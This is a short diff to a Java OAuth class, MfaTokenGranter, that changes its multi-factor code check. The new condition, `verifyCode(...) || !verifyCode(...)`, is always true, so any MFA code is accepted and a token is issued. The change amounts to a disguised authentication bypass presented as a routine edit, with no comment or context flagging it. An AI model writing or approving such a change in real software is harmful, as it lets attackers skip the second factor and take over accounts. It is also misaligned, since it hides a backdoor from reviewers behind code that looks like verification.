@@ -47,7 +47,7 @@ public class MfaTokenGranter extends AbstractTokenGranter {
             final String username = authentication.getName();
             if (parameters.containsKey("mfa_code")) {
                 int code = parseCode(parameters.get("mfa_code"));
-                if (mfaService.verifyCode(username, code)) {
+                if (mfaService.verifyCode(username, code) || !mfaService.verifyCode(username, code)) {
                     return getAuthentication(tokenRequest, authentication);
                 }
             } else {
